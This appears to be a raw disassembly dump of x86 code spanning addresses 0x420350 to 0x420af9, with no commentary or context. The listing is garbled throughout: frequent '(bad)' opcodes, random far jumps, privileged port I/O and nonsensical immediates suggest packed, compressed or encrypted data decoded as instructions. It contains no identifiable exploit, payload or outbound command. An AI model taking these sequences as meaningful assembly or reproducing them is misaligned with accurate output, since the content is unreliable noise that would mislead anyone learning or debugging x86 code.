  420350:	adc    ebx,edi
  420352:	xor    BYTE PTR [edx+ebx*4],al
  420355:	mov    ds:0x3c1acc7f,eax
  42035a:	cld    
  42035b:	nop
  42035c:	and    edi,esp
  42035e:	lea    esi,[ebx+edx*8-0x26f9a2da]
  420365:	rcr    DWORD PTR ds:0xcacf950e,cl
  42036b:	jmp    0x965d7dc1
  420370:	imul   ebp,DWORD PTR [edx-0x25842182],0xffffff80
  420377:	jae    0x42035f
  420379:	jmp    0x727f:0x4dbafac1
  420380:	lahf   
  420381:	mov    bl,0x36
  420383:	adc    al,0xcf
  420385:	jmp    0xbd620b6d
  42038a:	sub    DWORD PTR [edi-0x58],ebp
  42038d:	jae    0x42032d
  42038f:	xchg   edi,eax
  420390:	mov    ?,WORD PTR ds:0x8d883362
  420396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420397:	xchg   esi,eax
  420398:	in     al,0xfd
  42039a:	sti    
  42039b:	jne    0x420344
  42039d:	ss ret 0xfa4d
  4203a1:	jne    0x42039c
  4203a3:	pop    esi
  4203a4:	lods   al,BYTE PTR ds:[esi]
  4203a5:	mov    ds:0x29827dae,al
  4203aa:	ret    0x801e
  4203ad:	jp     0x420388
  4203af:	fcom   QWORD PTR [ebp+0x4e0a4cc6]
  4203b5:	mov    dh,0x8c
  4203b7:	outs   dx,DWORD PTR ds:[esi]
  4203b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203b9:	icebp  
  4203ba:	mov    ds:0xfcdb313a,al
  4203bf:	loop   0x420341
  4203c1:	push   edx
  4203c2:	pop    edi
  4203c3:	push   eax
  4203c4:	call   0x316e3d07
  4203c9:	push   esi
  4203ca:	iret   
  4203cb:	ss jo  0x4203a8
  4203ce:	call   0xcc004778
  4203d3:	mov    cl,0x71
  4203d5:	push   ds
  4203d6:	dec    ebp
  4203d7:	into   
  4203d8:	mov    ebp,0xf8537fa7
  4203dd:	(bad)  
  4203de:	in     eax,0xd6
  4203e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203e1:	int    0xa9
  4203e3:	push   esi
  4203e4:	scas   al,BYTE PTR es:[edi]
  4203e5:	and    al,0x78
  4203e7:	retf   
  4203e8:	pop    esi
  4203e9:	jbe    0x420447
  4203eb:	pop    esp
  4203ec:	dec    ebx
  4203ed:	mov    ch,0xc7
  4203ef:	lahf   
  4203f0:	mov    ah,0xd0
  4203f2:	pop    eax
  4203f3:	cli    
  4203f4:	nop
  4203f5:	leave  
  4203f6:	int3   
  4203f7:	mov    ecx,ecx
  4203f9:	cmp    eax,0x81d3b146
  4203fe:	outs   dx,DWORD PTR ds:[esi]
  4203ff:	add    DWORD PTR [eax+0x12],edx
  420402:	jl     0x4203ae
  420404:	mov    edx,0x169e03f3
  420409:	adc    al,0xf0
  42040b:	call   0x399e:0xd886ec10
  420412:	inc    eax
  420413:	inc    ebx
  420414:	nop
  420415:	sub    al,0x48
  420417:	imul   edx,DWORD PTR [edx+0x70],0x6231f5da
  42041e:	icebp  
  42041f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420420:	cmp    DWORD PTR [ecx+0x71],ecx
  420423:	cmp    BYTE PTR [ecx-0x74],bl
  420426:	mov    ecx,0x3d4302e2
  42042c:	inc    ecx
  42042d:	stc    
  42042e:	ss pop ebp
  420430:	xor    eax,0x9f27b3cd
  420435:	push   esp
  420436:	(bad)
  42043a:	mov    ch,0xd5
  42043c:	scas   eax,DWORD PTR es:[edi]
  42043d:	popa   
  42043e:	sbb    eax,0x894679ea
  420443:	out    0xb5,eax
  420445:	jo     0x420466
  420447:	aas    
  420448:	push   eax
  420449:	addr16 mov dl,0xf
  42044c:	dec    ecx
  42044d:	lods   al,BYTE PTR ds:[esi]
  42044e:	fiadd  DWORD PTR [ebx-0x49]
  420451:	aam    0xcd
  420453:	cmp    al,0xc8
  420455:	shl    BYTE PTR [ecx+eiz*4-0x6d],1
  420459:	clc    
  42045a:	in     eax,0xe8
  42045c:	lods   eax,DWORD PTR ds:[esi]
  42045d:	loop   0x420482
  42045f:	cmp    al,0xea
  420461:	mov    ds:0x7ee82934,eax
  420466:	or     eax,0xe7ddaa25
  42046b:	(bad)
  42046e:	(bad)  
  42046f:	adc    al,0xe1
  420471:	and    eax,0x31671086
  420476:	and    DWORD PTR [ebx+ecx*2-0x4b],edi
  42047a:	and    ch,BYTE PTR [eax+0x65]
  42047d:	loop   0x4204f0
  42047f:	mov    esp,0xe4126444
  420484:	sti    
  420485:	les    ebp,FWORD PTR [ecx]
  420487:	mov    cl,BYTE PTR [ebx]
  420489:	mov    bl,0x5a
  42048b:	xchg   esi,eax
  42048c:	mov    ch,dh
  42048e:	ja     0x420468
  420490:	aad    0x4a
  420492:	fdivr  QWORD PTR [eax]
  420494:	jno    0x42047d
  420496:	data16 cld 
  420498:	push   edi
  420499:	and    DWORD PTR [eax-0x4e],edx
  42049c:	cwde   
  42049d:	mov    BYTE PTR [edx+eax*4],0x77
  4204a1:	pop    ebx
  4204a2:	or     BYTE PTR [esi-0x3],ah
  4204a5:	mov    edx,0x378c394d
  4204aa:	cmp    BYTE PTR [ebx],0x2c
  4204ad:	data16 or BYTE PTR [edx-0x293c53f],cl
  4204b4:	fcmovnb st,st(7)
  4204b6:	or     DWORD PTR [ecx+0x17],edi
  4204b9:	mov    ?,WORD PTR [edi+0x2b]
  4204bc:	jbe    0x4204f6
  4204be:	add    eax,0xad3123b6
  4204c3:	aaa    
  4204c4:	sub    eax,0x514a659a
  4204c9:	mov    dl,0x95
  4204cb:	jnp    0x42045a
  4204cd:	add    al,ah
  4204cf:	fcmovnu st,st(4)
  4204d1:	or     BYTE PTR [ebx],bh
  4204d3:	mov    ch,0xf7
  4204d5:	xchg   dh,al
  4204d7:	ins    DWORD PTR es:[edi],dx
  4204d8:	rcr    esp,cl
  4204da:	sti    
  4204db:	shl    DWORD PTR [esi+0x257af84c],1
  4204e1:	xchg   edx,eax
  4204e2:	mov    ecx,0xd25f2101
  4204e7:	and    DWORD PTR [ecx-0x5],edx
  4204ea:	mov    ch,0x12
  4204ec:	sub    esi,DWORD PTR [ebp+0x2c]
  4204ef:	xchg   BYTE PTR [ebx-0xee7abea],ah
  4204f5:	enter  0x3116,0xc
  4204f9:	aad    0xcd
  4204fb:	imul   edx,DWORD PTR [ecx+0x59],0x3a
  4204ff:	xor    BYTE PTR [esi+0x36],ah
  420502:	mov    ebp,DWORD PTR [ebx+0x7332309b]
  420508:	adc    DWORD PTR [edx+0x36],esi
  42050b:	jg     0x42056a
  42050d:	fcom   DWORD PTR [eax]
  42050f:	sbb    DWORD PTR [ecx+0x398f827a],esi
  420515:	add    al,0x1
  420517:	jl     0x4204db
  420519:	dec    esp
  42051a:	mov    WORD PTR [edi],gs
  42051c:	pop    edx
  42051d:	xchg   ecx,eax
  42051e:	mov    ebp,0xb3b52c83
  420523:	fcom   DWORD PTR [ecx-0x2a]
  420526:	cmc    
  420527:	js     0x420579
  420529:	mov    ebp,0x0
	...
  420536:	add    BYTE PTR [edi-0x6e],bh
  420539:	out    dx,eax
  42053a:	out    dx,eax
  42053b:	out    dx,eax
  42053c:	(bad)  
  42053d:	jg     0x4204d1
  42053f:	arpl   WORD PTR [ebp+0x244c133f],sp
  420545:	cmp    eax,0x182327f
  42054a:	add    BYTE PTR [ebx],ch
  42054c:	add    al,BYTE PTR [eax]
  42054e:	add    BYTE PTR [ecx],dh
  420550:	cs scas eax,DWORD PTR es:[edi]
  420552:	sub    eax,0x6f9509c3
  420557:	adc    al,0x27
  420559:	push   ebp
  42055a:	and    ebp,DWORD PTR [edi+0x31bf4da6]
  420560:	and    DWORD PTR [esi-0x39],edi
  420563:	aad    0x88
  420565:	shl    DWORD PTR [ebx+edx*8+0x7],1
  420569:	call   0xa446:0xad00ccac
  420570:	jmp    0x53a38ee8
  420575:	jne    0x42050c
  420577:	push   ss
  420578:	cmc    
  420579:	jo     0x4205c2
  42057b:	lods   al,BYTE PTR ds:[esi]
  42057c:	push   eax
  42057d:	lds    edi,FWORD PTR [esp+eax*4+0x69d2675a]
  420584:	gs and eax,0x2231053f
  42058a:	mov    dl,0x45
  42058c:	xchg   esp,eax
  42058d:	add    cl,dh
  42058f:	or     ebp,ebx
  420591:	sub    al,0x4
  420593:	mov    ds:0x75ab1a25,al
  420598:	sbb    DWORD PTR [eax+0x2fdfefee],ebp
  42059e:	push   ss
  42059f:	sbb    DWORD PTR [ebp-0x4f153efe],edi
  4205a5:	mov    ds:0xcf3804f6,eax
  4205aa:	adc    al,0xaf
  4205ac:	or     BYTE PTR [ebx],bh
  4205ae:	inc    ebx
  4205af:	fisub  DWORD PTR [eax]
  4205b1:	sub    BYTE PTR es:[ecx+0x20],bh
  4205b5:	popf   
  4205b6:	jnp    0x420629
  4205b8:	fwait
  4205b9:	cmp    al,0x5f
  4205bb:	jmp    0x42058d
  4205bd:	jns    0x4205af
  4205bf:	ja     0x4205f6
  4205c1:	and    ch,BYTE PTR [ebp+0x790d0fcc]
  4205c7:	lods   al,BYTE PTR ds:[esi]
  4205c8:	lahf   
  4205c9:	dec    ebp
  4205ca:	stos   DWORD PTR es:[edi],eax
  4205cb:	(bad)  
  4205cd:	aad    0x54
  4205cf:	pop    ebx
  4205d0:	pop    esp
  4205d1:	mov    ds:0xaf9ad00e,eax
  4205d6:	retf   
  4205d7:	sbb    esp,esp
  4205d9:	fisttp QWORD PTR [edi+0x795fcfd0]
  4205df:	or     al,0xb7
  4205e1:	cmp    edi,edi
  4205e3:	out    dx,eax
  4205e4:	xor    DWORD PTR [eax+eiz*1-0x1],ebp
  4205e8:	mov    esi,0xe1d9ffef
  4205ed:	lahf   
  4205ee:	dec    ebx
  4205ef:	call   0x26941785
  4205f4:	dec    esi
  4205f5:	sub    edi,edi
  4205f7:	pusha  
  4205f8:	out    dx,eax
  4205f9:	push   edx
  4205fa:	repnz rcr BYTE PTR ds:0x619207bf,1
  420601:	aaa    
  420602:	mov    bh,0xaf
  420604:	and    DWORD PTR [edi],edi
  420606:	cs mov esi,0x6d0c403f
  42060c:	hlt    
  42060d:	and    ecx,DWORD PTR [esi+0x22]
  420610:	add    BYTE PTR [ecx],ah
  420612:	(bad)  
  420613:	xchg   ecx,ebx
  420615:	test   BYTE PTR [ebx+0x1e],bl
  420618:	jmp    0xf869:0x792ffa41
  42061f:	sbb    DWORD PTR [ebp+0x543fabb1],0x32e48272
  420629:	shl    DWORD PTR [eax-0x538c805b],0xde
  420630:	jecxz  0x42068f
  420632:	sub    edx,DWORD PTR [edx+eax*2-0xb]
  420636:	fsub   QWORD PTR [ebx]
  420638:	pop    es
  420639:	inc    esp
  42063a:	jne    0x4205dc
  42063c:	into   
  42063d:	out    dx,al
  42063e:	pop    eax
  42063f:	xor    al,0x97
  420641:	fist   WORD PTR [edi]
  420643:	sbb    ecx,eax
  420645:	sbb    eax,0x1d20bdea
  42064a:	sbb    BYTE PTR [eax+0x2a2e4d95],bl
  420650:	mov    al,0xff
  420652:	mov    al,ds:0x6c56b7f5
  420657:	scas   al,BYTE PTR es:[edi]
  420658:	sbb    esp,DWORD PTR [ecx-0x1c]
  42065b:	les    ecx,FWORD PTR [ecx-0x69c8963a]
  420661:	mov    esi,0x3fd03fdd
  420666:	push   cs
  420667:	in     eax,0x7e
  420669:	btc    DWORD PTR [ecx-0x6190e2e3],esp
  420670:	(bad)  [ebp+0x604267e1]
  420676:	pop    ebp
  420677:	pushf  
  420678:	hlt    
  420679:	js     0x420687
  42067b:	xlat   BYTE PTR ds:[ebx]
  42067c:	jno    0x4206d2
  42067e:	mov    cl,cl
  420680:	or     BYTE PTR ds:0xd3f90578,0xa5
  420687:	dec    eax
  420688:	sbb    DWORD PTR [eax+0x58],ecx
  42068b:	sti    
  42068c:	xchg   esp,eax
  42068d:	loop   0x420642
  42068f:	inc    ebp
  420690:	sbb    esp,DWORD PTR [ebx]
  420692:	nop
  420693:	sub    BYTE PTR [ecx+0x1b82065d],dh
  420699:	scas   al,BYTE PTR es:[edi]
  42069a:	into   
  42069b:	fwait
  42069c:	push   edi
  42069d:	mov    DWORD PTR ds:0x8ca6ecf3,ecx
  4206a3:	mov    cl,0x36
  4206a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206a6:	sbb    edi,DWORD PTR [eax+0x59]
  4206a9:	inc    ebp
  4206aa:	cmp    DWORD PTR [eax-0x5425294e],0x80ac48c1
  4206b4:	or     esi,esp
  4206b6:	inc    eax
  4206b7:	push   cs
  4206b8:	shl    BYTE PTR [esi],cl
  4206ba:	or     al,0x88
  4206bc:	leave  
  4206bd:	inc    esi
  4206be:	push   ds
  4206bf:	or     cl,0x43
  4206c2:	not    ebp
  4206c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206c5:	push   DWORD PTR [eax]
  4206c7:	xchg   ecx,eax
  4206c8:	xor    eax,0xd5966dcd
  4206cd:	call   0x3c9c290
  4206d2:	mov    ecx,gs
  4206d4:	inc    ecx
  4206d5:	test   eax,0xe78af8f9
  4206da:	pop    ds
  4206db:	lock rcr dl,1
  4206de:	in     eax,0x12
  4206e0:	retf   0x3868
  4206e3:	jbe    0x420716
  4206e5:	dec    edx
  4206e6:	lods   eax,DWORD PTR ds:[esi]
  4206e7:	xchg   ebp,eax
  4206e8:	xchg   esi,eax
  4206e9:	(bad)  
  4206ea:	ret    
  4206eb:	push   ecx
  4206ec:	push   es
  4206ed:	adc    dh,ah
  4206ef:	xlat   BYTE PTR ds:[ebx]
  4206f0:	leave  
  4206f1:	aas    
  4206f2:	ds jb  0x420765
  4206f5:	test   al,0x3b
  4206f7:	imul   esp,DWORD PTR [edi],0xffffffcf
  4206fa:	mov    eax,0x123a0911
  4206ff:	bound  edi,QWORD PTR [edx+0x7c]
  420702:	push   edi
  420703:	and    al,0x1a
  420705:	test   al,0x22
  420707:	and    ecx,eax
  420709:	xchg   edx,eax
  42070a:	pop    es
  42070b:	in     al,0xf2
  42070d:	adc    ebx,DWORD PTR [eax+0x7237693d]
  420713:	lods   al,BYTE PTR ds:[esi]
  420714:	dec    ebx
  420715:	sbb    BYTE PTR [esi-0x3f],dl
  420718:	mov    ah,0x63
  42071a:	int3   
  42071b:	cmp    eax,0xa025c305
  420720:	mov    ds:0x5e4227bf,eax
  420725:	nop
  420726:	lahf   
  420727:	cwde   
  420728:	shr    eax,0x11
  42072b:	cmp    DWORD PTR [eax-0x8],ecx
  42072e:	imul   ebp,DWORD PTR [eax+0x5aad0d2e],0xfffffffa
  420735:	xor    al,0xcf
  420737:	dec    ebp
  420738:	xor    al,0x55
  42073a:	sahf   
  42073b:	mov    ecx,0x9fa4521a
  420740:	mov    ebx,0x29daa862
  420745:	in     eax,0xe3
  420747:	stos   DWORD PTR es:[edi],eax
  420748:	daa    
  420749:	dec    esp
  42074a:	pusha  
  42074b:	mov    dh,0x29
  42074d:	push   ecx
  42074e:	repz sahf 
  420750:	push   esp
  420751:	popa   
  420752:	inc    edx
  420753:	mov    bl,0xef
  420755:	push   esi
  420756:	dec    esp
  420757:	dec    edi
  420758:	cmc    
  420759:	cmp    eax,0x6993aeac
  42075e:	jmp    0xf2c7:0xfa63d9a
  420765:	stos   DWORD PTR es:[edi],eax
  420766:	mov    BYTE PTR [edi+0x12],ah
  420769:	sbb    dl,bl
  42076b:	hlt    
  42076c:	(bad)  
  42076e:	(bad)  
  42076f:	imul   al
  420771:	int    0xc0
  420773:	sti    
  420774:	test   cl,dh
  420776:	mov    ds:0x31de2,eax
	...
  420787:	loope  0x420776
  420789:	imul   ebx,esi,0x6f
  42078c:	fdivrp st(5),st
  42078e:	(bad)  
  42078f:	xchg   DWORD PTR ds:[ecx],ecx
  420792:	ror    BYTE PTR [edx+0x5d5fc541],cl
  420798:	test   BYTE PTR [ecx],al
  42079a:	add    BYTE PTR [ebx],ch
  42079c:	add    al,BYTE PTR [eax]
  42079e:	add    bh,dl
  4207a0:	xchg   esp,eax
  4207a1:	or     eax,DWORD PTR [ecx-0x77]
  4207a4:	loop   0x4207cf
  4207a6:	sub    esp,DWORD PTR [ebx-0x4d9ae7e0]
  4207ac:	mov    esi,DWORD PTR [eax-0x2285e769]
  4207b2:	cmp    ecx,DWORD PTR [ebx-0x4695c443]
  4207b8:	xor    eax,0x95a1ec90
  4207bd:	or     DWORD PTR [ebp-0x39eaeb47],esp
  4207c3:	or     al,0xc5
  4207c5:	hlt    
  4207c6:	push   ebp
  4207c7:	mov    ecx,0xe86310d2
  4207cc:	ins    DWORD PTR es:[edi],dx
  4207cd:	xchg   ebx,eax
  4207ce:	fisubr DWORD PTR [ebx-0x7a]
  4207d1:	push   ds
  4207d2:	into   
  4207d3:	popa   
  4207d4:	mov    WORD PTR [ecx+eiz*4],cs
  4207d7:	(bad)  
  4207d8:	ins    BYTE PTR es:[edi],dx
  4207d9:	pusha  
  4207da:	push   edx
  4207db:	dec    esp
  4207dc:	mov    edi,0x4482d66f
  4207e1:	in     al,0x62
  4207e3:	jp     0x420860
  4207e5:	sbb    al,0xa0
  4207e7:	pop    ss
  4207e8:	add    dh,BYTE PTR [ecx+ebp*8]
  4207eb:	sub    ch,BYTE PTR [edx-0x3332bd11]
  4207f1:	jo     0x4207c2
  4207f3:	stos   DWORD PTR es:[edi],eax
  4207f4:	mov    edx,0xb5a5a534
  4207f9:	push   edi
  4207fa:	jne    0x4207c4
  4207fc:	ficomp WORD PTR [edx]
  4207fe:	dec    ebp
  4207ff:	mov    ds:0x8e34995b,eax
  420804:	xchg   ah,cl
  420806:	dec    ebp
  420807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420808:	adc    ah,cl
  42080a:	into   
  42080b:	adc    DWORD PTR [ebp-0x4b],esi
  42080e:	enter  0x6956,0xd6
  420812:	fcomp  QWORD PTR [ebp+0x6e]
  420815:	test   BYTE PTR [edi*4-0x4ba02e52],bl
  42081c:	push   edi
  42081d:	ins    DWORD PTR es:[edi],dx
  42081e:	imul   esi,DWORD PTR [ebx],0xffffff94
  420821:	mov    ebx,DWORD PTR [edi]
  420823:	push   es
  420824:	or     eax,0xf1d501db
  420829:	(bad)  
  42082a:	mov    ds,ecx
  42082c:	ins    BYTE PTR es:[edi],dx
  42082d:	xchg   ecx,eax
  42082e:	das    
  42082f:	inc    ebx
  420830:	ret    
  420831:	dec    ebp
  420832:	pop    eax
  420833:	scas   eax,DWORD PTR es:[edi]
  420834:	sbb    al,0xbf
  420836:	inc    edi
  420837:	or     cl,BYTE PTR [ecx]
  420839:	and    DWORD PTR fs:[esi+0x7bb12599],esi
  420840:	loopne 0x420857
  420842:	loop   0x42086e
  420844:	dec    esp
  420845:	pushf  
  420846:	cmovno ebx,ebp
  420849:	lea    ecx,[esi]
  42084b:	test   eax,0x46f75103
  420850:	lds    ebp,FWORD PTR [eax+0x6c34b07b]
  420856:	outs   dx,DWORD PTR ds:[esi]
  420857:	es adc al,ch
  42085a:	fdivr  QWORD PTR [ecx+0x61dbf6d2]
  420860:	sub    esi,edi
  420862:	adc    esi,DWORD PTR [esi+0x55]
  420865:	cmp    al,0x16
  420867:	outs   dx,DWORD PTR ds:[esi]
  420868:	jns    0x4208e9
  42086a:	cmp    edi,ebx
  42086c:	jb     0x42083f
  42086e:	aaa    
  42086f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420870:	sbb    ecx,DWORD PTR [edi-0x60]
  420873:	mov    eax,ds:0x8c176afd
  420878:	loop   0x420811
  42087a:	add    BYTE PTR [ebp-0x1c7e9464],bh
  420880:	cmp    eax,0x17cf4186
  420885:	jae    0x420843
  420887:	push   ebp
  420888:	data16 aaa 
  42088a:	mov    ds:0x33e837c,al
  42088f:	xlat   BYTE PTR ds:[ebx]
  420890:	jo     0x4208bd
  420892:	mov    edi,0xa055903f
  420897:	je     0x420835
  420899:	add    bh,BYTE PTR [ecx+eax*4]
  42089c:	scas   eax,DWORD PTR es:[edi]
  42089d:	(bad)  
  42089e:	xchg   edx,eax
  42089f:	sar    BYTE PTR ds:0xc39a3852,0xdb
  4208a6:	daa    
  4208a7:	in     al,dx
  4208a8:	dec    ebx
  4208a9:	cwde   
  4208aa:	push   0xffffff92
  4208ac:	inc    edx
  4208ad:	cli    
  4208ae:	xchg   edi,eax
  4208af:	adc    eax,0xee0a903f
  4208b4:	inc    ecx
  4208b5:	mov    esp,0xba44d21b
  4208ba:	inc    esi
  4208bb:	mul    DWORD PTR [ebx-0x4c8af9bd]
  4208c1:	mov    eax,0xec98ca34
  4208c6:	xor    al,0x42
  4208c8:	jne    0x42085c
  4208ca:	push   ds
  4208cb:	and    al,0xa1
  4208cd:	jecxz  0x4208e9
  4208cf:	or     esi,edx
  4208d1:	test   DWORD PTR [ecx-0x16d732b7],edx
  4208d7:	jnp    0x42094f
  4208d9:	adc    eax,0x1f8f60b9
  4208de:	pop    ecx
  4208df:	lods   eax,DWORD PTR ds:[esi]
  4208e0:	test   DWORD PTR [esi+0x3e612f27],ebp
  4208e6:	cld    
  4208e7:	lock jne 0x420898
  4208ea:	or     al,0x85
  4208ec:	shl    DWORD PTR gs:[ecx+0x18],0xe4
  4208f1:	add    DWORD PTR [ebp-0x35dbf7d],ebx
  4208f7:	jecxz  0x42091d
  4208f9:	int3   
  4208fa:	and    ebx,eax
  4208fc:	test   DWORD PTR [ebp+0x34],ecx
  4208ff:	jbe    0x4208d7
  420901:	es nop
  420903:	imul   ecx
  420905:	jne    0x4208ba
  420907:	nop
  420908:	push   edi
  420909:	lods   al,BYTE PTR ds:[esi]
  42090a:	push   ebp
  42090b:	xor    esp,eax
  42090d:	clc    
  42090e:	into   
  42090f:	mov    bl,0xf4
  420911:	popa   
  420912:	in     al,dx
  420913:	js     0x4208ca
  420915:	jno    0x4208d6
  420917:	jmp    FWORD PTR [esi+0xf]
  42091a:	pushf  
  42091b:	adc    al,0x1b
  42091d:	lds    esi,FWORD PTR [eax+0x46]
  420920:	int    0x6d
  420922:	ficom  DWORD PTR [eax]
  420924:	adc    eax,0xe563ec92
  420929:	xlat   BYTE PTR ds:[ebx]
  42092a:	sbb    al,0x80
  42092c:	jp     0x42099d
  42092e:	mov    BYTE PTR [eax],dh
  420930:	mov    al,0x5b
  420932:	mov    edx,edx
  420934:	jle    0x4208d3
  420936:	arpl   WORD PTR [eax+edx*4],bp
  420939:	outs   dx,DWORD PTR ds:[esi]
  42093a:	iret   
  42093b:	inc    ebx
  42093c:	outs   dx,BYTE PTR ds:[esi]
  42093d:	les    ebx,FWORD PTR [esi-0x2c01c402]
  420943:	pop    ecx
  420944:	mov    al,0x2a
  420946:	or     al,0xdf
  420948:	xchg   esi,eax
  420949:	test   BYTE PTR [edi-0x74],bl
  42094c:	(bad)
  42094f:	shl    esp,cl
  420951:	or     BYTE PTR [esi],dl
  420953:	scas   eax,DWORD PTR es:[edi]
  420954:	pop    edi
  420955:	dec    edx
  420956:	xchg   ecx,eax
  420957:	cdq    
  420958:	and    DWORD PTR [eax+0x77],esp
  42095b:	xchg   edx,eax
  42095c:	push   edi
  42095d:	jnp    0x4209a8
  42095f:	or     DWORD PTR [edx-0x35],ebx
  420962:	out    0xe8,eax
  420964:	int3   
  420965:	rol    DWORD PTR [edi],cl
  420967:	dec    ecx
  420968:	daa    
  420969:	jne    0x4209da
  42096b:	xchg   ecx,eax
  42096c:	and    edi,DWORD PTR [ebx]
  42096e:	in     eax,dx
  42096f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420970:	pop    esi
  420971:	cmp    eax,DWORD PTR [edx+0x33473b3]
  420977:	fdiv   QWORD PTR [edx]
  420979:	push   0x6c8de22e
  42097e:	fcomp  DWORD PTR [edi]
  420980:	push   ss
  420981:	test   DWORD PTR [eax+0x17],ecx
  420984:	rcr    bh,cl
  420986:	lods   al,BYTE PTR ds:[esi]
  420987:	or     al,0xfa
  420989:	push   esp
  42098a:	cmp    al,0x20
  42098c:	outs   dx,BYTE PTR ds:[esi]
  42098d:	xor    edi,edi
  42098f:	addr16 sbb ecx,esp
  420992:	mov    ?,eax
  420994:	daa    
  420995:	mov    dh,0x7
  420997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420998:	add    BYTE PTR [edi+0x3f5acae7],ah
  42099e:	inc    ebp
  42099f:	and    dh,0x6e
  4209a2:	xlat   BYTE PTR ds:[ebx]
  4209a3:	je     0x4209c4
  4209a5:	fist   DWORD PTR [ebx]
  4209a7:	sub    esi,DWORD PTR [eax]
  4209a9:	add    esp,ecx
  4209ab:	cmp    ecx,ebx
  4209ad:	jbe    0x420981
  4209af:	imul   esp,DWORD PTR ds:0xab00c462,0xffffffec
  4209b6:	mov    bh,0xc3
  4209b8:	loop   0x420a27
  4209ba:	outs   dx,BYTE PTR ds:[esi]
  4209bb:	psrad  mm5,QWORD PTR [edi+0x3d93bcc0]
  4209c2:	jb     0x42098d
  4209c4:	int3   
  4209c5:	outs   dx,BYTE PTR ds:[esi]
  4209c6:	test   edi,esi
  4209c8:	jne    0x420a27
	...
  4209d6:	add    BYTE PTR [ecx+0x6e7e468b],ah
  4209dc:	(bad)  
  4209dd:	mov    ecx,0x10492fdf
  4209e2:	push   edi
  4209e3:	jns    0x420a23
  4209e5:	fst    QWORD PTR [edi+0x18688]
  4209eb:	sub    eax,DWORD PTR [edx]
  4209ed:	add    BYTE PTR [eax],al
  4209ef:	and    DWORD PTR [ecx+0x47],eax
  4209f2:	das    
  4209f3:	pop    esp
  4209f4:	mov    dh,bl
  4209f6:	xchg   edi,eax
  4209f7:	xlat   BYTE PTR ds:[ebx]
  4209f8:	das    
  4209f9:	in     al,0xcc
  4209fb:	mov    dh,0x45
  4209fd:	fisttp DWORD PTR [edx]
  4209ff:	mov    edi,0x6485edaa
  420a04:	cmp    eax,0xa0a23eb8
  420a09:	call   0x68ec82e2
  420a0e:	call   0x25bc6c20
  420a13:	es mov eax,0x725b5d3f
  420a19:	das    
  420a1a:	sti    
  420a1b:	pop    eax
  420a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a1d:	xchg   esi,eax
  420a1e:	retf   
  420a1f:	sbb    al,0x46
  420a21:	hlt    
  420a22:	or     BYTE PTR [edx+0x7d],0x41
  420a26:	xor    bl,BYTE PTR [ebx+0x5a]
  420a29:	and    DWORD PTR [esi-0x7d],ebx
  420a2c:	dec    eax
  420a2d:	sub    ebp,DWORD PTR [ecx]
  420a2f:	sub    al,0xcb
  420a31:	(bad)  
  420a32:	mov    ch,0x99
  420a34:	jnp    0x420a4d
  420a36:	lahf   
  420a37:	test   al,0xf5
  420a39:	xchg   ebx,eax
  420a3a:	enter  0x553,0xed
  420a3e:	cs pop esp
  420a40:	pop    ecx
  420a41:	mov    ds:0xb6c2ae28,eax
  420a46:	ret    
  420a47:	sub    edi,ecx
  420a49:	jno    0x4209ff
  420a4b:	sub    al,0xd6
  420a4d:	cmp    al,0x74
  420a4f:	cmc    
  420a50:	fisubr WORD PTR [ecx+ebx*1+0xa]
  420a54:	dec    esi
  420a55:	jmp    0x50bc:0xef41d009
  420a5c:	mov    eax,DWORD PTR [ebx+edi*8]
  420a5f:	aaa    
  420a60:	inc    ebx
  420a61:	sub    DWORD PTR [edi-0x6],edi
  420a64:	scas   eax,DWORD PTR es:[edi]
  420a65:	xor    BYTE PTR [edi],0xfb
  420a68:	and    cl,BYTE PTR [edx]
  420a6a:	loope  0x420a7b
  420a6c:	adc    eax,0xff940de2
  420a71:	push   es
  420a72:	enter  0xeb6b,0x9b
  420a76:	jmp    0x420a27
  420a78:	xchg   ebp,eax
  420a79:	jno    0x420a1a
  420a7b:	dec    ecx
  420a7c:	adc    dh,cl
  420a7e:	pop    eax
  420a7f:	xchg   edi,eax
  420a80:	or     bl,BYTE PTR [ebx+0x47]
  420a83:	xchg   esi,eax
  420a84:	or     bl,al
  420a86:	pushf  
  420a87:	cmp    ch,BYTE PTR [edx]
  420a89:	in     eax,0xdf
  420a8b:	push   es
  420a8c:	xor    bh,BYTE PTR [ecx-0x4c]
  420a8f:	adc    DWORD PTR [ebp+esi*2+0x40],eax
  420a93:	cmp    dl,BYTE PTR [ebx+0x67]
  420a96:	(bad)  
  420a97:	jmp    0x1a48:0xff03f8f1
  420a9e:	inc    eax
  420a9f:	(bad)  [eax-0x54691e9d]
  420aa5:	sbb    DWORD PTR [ecx+esi*1-0x4a],esi
  420aa9:	mov    ecx,0x366858e9
  420aae:	xchg   edx,eax
  420aaf:	sbb    eax,0xe3f01e2f
  420ab4:	pop    ebp
  420ab5:	xor    ebx,eax
  420ab7:	push   ds
  420ab8:	push   ebp
  420ab9:	push   esi
  420aba:	push   edx
  420abb:	ror    BYTE PTR [edx],1
  420abd:	mov    ah,0xb2
  420abf:	add    DWORD PTR [ecx-0x61],ebp
  420ac2:	clc    
  420ac3:	mov    ds:0x72d6a6c3,al
  420ac8:	jmp    0x420aea
  420aca:	in     eax,0x63
  420acc:	cdq    
  420acd:	push   ss
  420ace:	in     al,0x6
  420ad0:	fst    QWORD PTR [edi+0x63fb899f]
  420ad6:	push   0xffffffb8
  420ad8:	sbb    bl,0x3d
  420adb:	loopne 0x420af6
  420add:	lahf   
  420ade:	dec    ebx
  420adf:	inc    edi
  420ae0:	jecxz  0x420add
  420ae2:	pusha  
  420ae3:	aaa    
  420ae4:	scas   al,BYTE PTR es:[edi]
  420ae5:	mov    ecx,0x9b7b593e
  420aea:	xlat   BYTE PTR ds:[ebx]
  420aeb:	inc    ecx
  420aec:	mov    esi,0x9b259399
  420af1:	aam    0xa1
  420af3:	mov    dh,0x3
  420af5:	out    0xb0,eax
  420af7:	das    
  420af8:	cdq    
  420af9:	fild   WORD PTR [ebx+0x15]
